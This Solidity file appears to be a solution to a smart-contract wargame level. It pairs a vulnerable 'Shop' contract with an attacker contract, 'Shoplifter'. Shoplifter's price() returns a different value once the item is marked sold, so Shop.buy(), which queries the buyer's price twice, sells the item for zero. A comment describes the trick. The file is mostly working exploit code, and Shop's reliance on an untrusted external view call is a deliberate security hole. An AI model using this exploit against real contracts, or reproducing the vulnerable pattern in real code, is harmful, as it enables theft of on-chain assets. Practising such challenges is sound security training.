// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//if msg.sender is a contract instead of an EoA then we can call buy() with it and include a 
//function that is called price() but returns some fucked up shit instead

contract Shoplifter {
    Shop shop;
    constructor(address _target) {
        shop = Shop(_target);
    }
    function price() external view returns (uint){
        if (shop.isSold() == true) {
            return 0;
        } else {
            return 100;
        }
    }
    function pwn() external {
        shop.buy();
    }
}

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}